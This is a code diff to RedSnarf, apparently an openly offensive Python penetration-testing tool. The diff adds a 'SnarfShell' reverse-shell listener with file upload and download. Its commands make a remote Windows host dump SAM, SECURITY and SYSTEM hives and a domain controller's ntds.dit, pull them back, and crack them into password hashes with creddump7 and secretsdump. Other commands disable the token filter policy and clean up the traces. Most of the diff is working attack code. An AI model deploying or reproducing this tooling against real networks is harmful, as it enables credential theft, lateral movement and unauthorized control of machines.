@@ -2143,6 +2143,304 @@ def userstatus(targetpath,dcip,inputfile,dom_name):
 		with open(targetpath+str(dcip)+'/'+'disabled_'+inputfile) as f:
 			print colored("[+]"+str(sum(1 for _ in f))+" disabled accounts written to "+targetpath+str(dcip)+'/'+'disabled_'+inputfile,'green')
 
+#Function handles file upload
+def upload(s,path,command):
+    s.send(command)
+    if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(4096)
+        print colored("[+]Sending data",'yellow')
+        while packet != '':
+            s.send(packet) 
+            packet = f.read(4096)
+        s.send('DONE')
+        f.close()
+        
+    else: # the file doesn't exist
+        s.send('[-]Unable to find out the file')
+
+    print colored("[+]File uploaded to cwd on remote machine",'green')
+
+#Function handles file download
+def transfer(conn,command,filename,remoteip,dp):
+    if dp=="":
+        downloadpth="/tmp/"+remoteip+"/"
+    else:
+        downloadpth="/tmp/"+remoteip+"/"+dp
+
+    if not os.path.isdir(downloadpth):
+        proc = subprocess.Popen("mkdir "+downloadpth, stdout=subprocess.PIPE,shell=True)
+        stdout_value = proc.communicate()[0]
+
+    conn.send(command)
+    f = open(downloadpth+filename,'wb')
+    while True:  
+        bits = conn.recv(4096)
+        if 'Unable to find out the file' in bits:
+            print colored('[-]Unable to find out the file..','red')
+            break
+        if bits.endswith('DONE'):
+            print colored('[+]Download complete, file written to '+downloadpth+filename,'green')
+            #f.write(bits[0:len(bits)-4])
+            f.close()
+            break
+        f.write(bits)
+
+#SnarfShell Party starts here!
+def connect():
+    try:
+        
+        #Get ip and port to listen on
+        ipaddress=raw_input("[+]Enter the IP address you wish to listen on (default 0.0.0.0): ")
+        port=raw_input("[+]Enter the Port you wish to listen on (default 4444): ")
+
+        if ipaddress=="":
+            ipaddress="0.0.0.0"
+
+        if port=="":
+            port="4444"
+
+        #Start listener
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((ipaddress, int(port)))
+        s.listen(1)
+        
+        print colored('[+]Listening on '+ ipaddress +':'+port,'yellow')
+        conn, addr = s.accept()
+        print colored('[+]We have a connection from: '+ str(addr),'green')
+
+        #Start shell
+        while True:       
+            command = raw_input("SnarfShell> ")
+            #Close the connection properly
+            if command=='quit':
+                conn.send('quit')
+                conn.close() 
+                break
+            #Process download
+            elif 'download' in command: 
+                #Get the file name from the download string and pass to transfer                              
+                file=command.split('\\')
+                #Try and transfer file
+                print file[len(file)-1]
+                transfer(conn,command,file[len(file)-1],str(addr[0]),"")
+            #Process help 
+            elif 'help' in command:
+                #Offer some basic help information
+                print colored("[+]RedSnarf Basic Shell:",'red')
+                print colored("[?]Available Commands:",'yellow')
+                print "\tenable_lat          - enable local access token filter policy"
+                print "\tdisable_lat         - disable local access token filter policy"
+                print "\tcreds               - dump sam/security/system from remote to local machine"
+                print "\tntds_dump           - dump ntds.dit from remote dc to local machine and parse"
+                print "\tdownload*pathtofile - download file from remote to local machine"
+                print "\tupload*pathtofile   - upload file from local machine to cwd on remote machine"
+                print "\tlock_workstation    - lock remote workstation"
+                print "\t*LinuxCommandHere   - to run linux commands on local machine via shell prefix them with *"
+                print "\tprivesc             - Generate a csv for use with Windows Exploit Suggester"
+                print "\t                      https://github.com/GDSSecurity/Windows-Exploit-Suggester"
+                print "\tcd                  - change directory"
+                print "\tnet                 - windows net command"
+                print "\tdir                 - windows dir command"
+                print "\tmkdir               - create a new directory"
+                print "\trmdir               - delete a directory and all files/folders within"
+                print "\tdel                 - delete file"
+                print "\tquit                - close connection"
+                print colored("\n[?]Most native Windows commands work, if not sure - give it a try!\n",'yellow')
+                pass
+            #Process creds
+            elif command=='creds':
+                #Generate Files on Remote Machine
+                print colored("[+]Sending command to generate c:\sam, c:\system, c:\security",'green')
+                conn.send('creds')
+                #Get return
+                while True:
+                    data = conn.recv(4096)
+                    recv_len=len(data)
+                    if data=="[+]ET":
+                        break
+
+                    print data
+
+                #Download the files to local machine
+                print colored("[+]Download c:\sam",'yellow')
+                transfer(conn,"download*c:\sam","sam",str(addr[0]),"")
+                print colored("[+]Download c:\security",'yellow')
+                transfer(conn,"download*c:\security","security",str(addr[0]),"")
+                print colored("[+]Download c:\system",'yellow')
+                transfer(conn,"download*c:\system","system",str(addr[0]),"")
+                
+                #Clean Up Files on Remote Machine
+                conn.send('creds_cleanup')
+                #Get return
+                while True:
+                    data = conn.recv(4096)
+                    recv_len=len(data)
+                    if data=="[+]ET":
+                        break
+
+                    print data
+
+                #Parse the files locally
+                if os.path.exists("/tmp/"+str(addr[0])+"/"):
+                    print colored("\n\n[+]Parsing SAM/SECURITY/SYSTEM with CredDump 7",'yellow')
+                    print colored("[+]Using pwdump: "+str(addr[0]),'green')
+                    if os.path.exists(creddump7path+"pwdump.py"):
+                        os.system(creddump7path+"pwdump.py "+"/tmp/"+str(addr[0])+"/system "+"/tmp/"+str(addr[0])+"/sam | tee "+"/tmp/"+str(addr[0])+"/pwdump")
+
+                    for p in progs:
+                        try:
+                            print colored("[+]Using "+p+": "+str(addr[0]) ,'green')
+                            if os.path.exists(creddump7path+p+".py"):
+                                os.system(creddump7path+p+".py "+"/tmp/"+str(addr[0])+"/system "+"/tmp/"+str(addr[0])+"/security true | tee "+"/tmp/"+str(addr[0])+"/"+p+"")
+                        except OSError:
+                            print colored("[-]Something went wrong extracting from "+p,'red')
+                        if os.stat("/tmp/"+str(addr[0])+"/cachedump").st_size == 0:
+                            print colored("[-]No cached creds for: "+str(addr[0]),'yellow')
+            #Process upload
+            elif 'upload' in command:
+                #Work out path       
+                grab,path = command.split('*')
+                try:                          
+                    upload(conn,path,command)
+                except Exception,e:
+                    s.send ( str(e) )
+                    pass
+            #Process ntds_dump
+            elif command=='ntds_dump':
+                #Send ntds_dump command to remote machine
+                print colored("[+]Dumping NTDS.dit",'green')
+                conn.send('ntds_dump')
+                #Get return
+                while True:
+                    data = conn.recv(4096)
+                    recv_len=len(data)
+                    if data=="[+]ET":
+                        break
+
+                    print data
+                #Download files
+                print colored("[+]Downloading NTDS.dit",'yellow')
+                transfer(conn,"download*C:\\redsnarf\\Active Directory\\ntds.dit","ntds.dit",str(addr[0]),"Active_Directory/")
+                print colored("[+]Downloading SECURITY",'yellow')
+                transfer(conn,"download*C:\\redsnarf\\registry\\SECURITY","SECURITY",str(addr[0]),"registry/")
+                print colored("[+]Downloading SYSTEM",'yellow')
+                transfer(conn,"download*C:\\redsnarf\\registry\\SYSTEM","SYSTEM",str(addr[0]),"registry/")
+                
+                #Clean Up Files on Remote Server
+                conn.send('ntds_cleanup')
+                #Get return
+                while True:
+                    data = conn.recv(4096)
+                    recv_len=len(data)
+                    if data=="[+]ET":
+                        break
+
+                    print data
+                #Assumes all files have downloaded ok
+                #Parse the dump with secretsdump to get hashes.
+                os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -system "+"/tmp/"+str(addr[0])+'/registry/SYSTEM '+ "-ntds "+"/tmp/"+str(addr[0])+"/Active_Directory/ntds.dit" +" -outputfile "+"/tmp/"+str(addr[0])+"/hashdump local")
+                print colored("[+]Dumped Hashes to "+"/tmp/"+str(addr[0])+"/hashdump.ntds",'green')
+            #Process enable_lat
+            elif command=='enable_lat':
+                #Send command
+                print colored("[+]Enabling Local Access Token Filter Policy",'green')
+                conn.send('enable_lat')
+                #Get return
+                while True:
+                    data = conn.recv(4096)
+                    recv_len=len(data)
+                    if data=="[+]ET":
+                        break
+
+                    print data
+            #Process privesc
+            elif command=='privesc':
+                #Send command
+                print colored("[+]Generating SystemInfomation file...",'green')
+                conn.send('privesc')
+                #Get return
+                while True:
+                    data = conn.recv(4096)
+                    recv_len=len(data)
+                    if "path=" in data:
+                        privfilepath=data
+                    
+                    if data=="[+]ET":
+                        break
+
+                    #print data
+
+                if privfilepath[0:5]=="path=":
+                    privfilepath=privfilepath[5:len(privfilepath)]
+                    #print privfilepath
+                    print colored("[+]Downloading PrivEsc File",'yellow')
+                    transfer(conn,"download*"+privfilepath,"privesc.csv",str(addr[0]),"")
+
+                    #Clean Up Files on Remote Machine
+                    conn.send('privesc_cleanup')
+                    #Get return
+                    while True:
+                        data = conn.recv(4096)
+                        recv_len=len(data)
+                        if data=="[+]ET":
+                            break
+
+                        print data
+
+            #Process disable lat
+            elif command=='disable_lat':
+                #Send command
+                print colored("[+]Disabling Local Access Token Filter Policy",'green')
+                conn.send('disable_lat')
+                #Get return
+                while True:
+                    data = conn.recv(4096)
+                    recv_len=len(data)
+                    if data=="[+]ET":
+                        break
+
+                    print data
+            #Process disable lat
+            elif command=='lock_workstation':
+                #Send command
+                print colored("[+]Locking remote workstation",'green')
+                conn.send('lock_workstation')
+                #Get return
+                while True:
+                    data = conn.recv(4096)
+                    recv_len=len(data)
+                    if data=="[+]ET":
+                        break
+
+                    print data
+            #Process Linux Command on Local Machine
+            elif command[0:1]=='*':
+                #Run Linux Command
+                os.system(command[1:len(command)])
+            #Process anything else
+            else:
+                #Send Any other Commands               
+                conn.send(command) 
+                #Get return
+                while True:
+                    data = conn.recv(4096)
+                    recv_len=len(data)
+                    if data=="[+]ET":
+                        break
+
+                    print data
+    
+    	sys.exit()
+
+    #Should capture most errors
+    except Exception,e:
+        print colored("[!]"+str(e),'red')
+        sys.exit()
+    except OSError,f:
+        print colored("[!]"+str(f),'red')
+        sys.exit()
+
 def main():
 	#Routine will spray hashes at ip's
 	if credsfile!='':
@@ -2247,7 +2545,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5k", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5l", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -2282,6 +2580,7 @@ ugroup.add_argument("-uO", "--delegated_privs", dest="delegated_privs", default=
 ugroup.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
 ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
 ugroup.add_argument("-uRP", "--rdp_connect", dest="rdp_connect", default="n", help="<Optional> Connect to existing RDP sessions without password")
+ugroup.add_argument("-uRS", "--snarf_shell", dest="snarf_shell", default="n", help="<Optional> Start Reverse Listening Snarf Shell")
 ugroup.add_argument("-uS", "--get_spn", dest="get_spn", default="n", help="<Optional> Get SPN's from DC")
 ugroup.add_argument("-uSS", "--split_spn", dest="split_spn", default="n", help="<Optional> Split SPN File")
 ugroup.add_argument("-uSG", "--session_gopher", dest="session_gopher", default="n", help="<Optional> Run Session Gopher on Remote Machine")
@@ -2399,6 +2698,7 @@ delegated_privs=args.delegated_privs
 windows_updates=args.windows_updates
 xscript=args.xscript
 mcafee_sites=args.mcafee_sites
+snarf_shell=args.snarf_shell
 
 #Check Bash Tab Complete Status and Display to Screen
 print colored("[+]Checking Bash Tab Completion Status",'yellow')
@@ -2413,6 +2713,10 @@ if args.auto_complete!='n':
 		os.system("exec bash")
 	else:
 		print colored("[-]File not copied",'yellow')
+	sys.exit()
+
+if args.snarf_shell!='n':
+	connect()
 	sys.exit()
 
 #Work around for if a password has !! as the command line will bork
@@ -2727,7 +3031,6 @@ if meterpreter_revhttps in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
-
 #Parse the ip to see if we are dealing with a single ip, a range or a file with multiple ips
 targets=[]
 remotetargets = args.host
@@ -2879,7 +3182,7 @@ if windows_updates != 'n':
 				print colored("[+]Any displayed below in red are priv esc vulnerabilities\n",'green')
 
 			for patches in missingpatches:
-				
+
 				for pesc in privesc:
 					if str(pesc) in patches:
 						dirty = "true"
@@ -2974,8 +3277,6 @@ if delegated_privs in yesanswers:
 				dirty="True"
 				#print line.split(" ")[1]
 				username.append(line.split(" ")[1]+":"+ou[1:(len(ou)-1)])
-
-
 
 	if dirty=="True":
 		print colored("\n[+]Users with interesting privileges...",'yellow')
@@ -4778,7 +5079,7 @@ if dropshell in yesanswers:
 					sys.exit()
 				elif response.upper()=="Q":
 					sys.exit()
-
+				
 				sys.exit()
 
 		except:
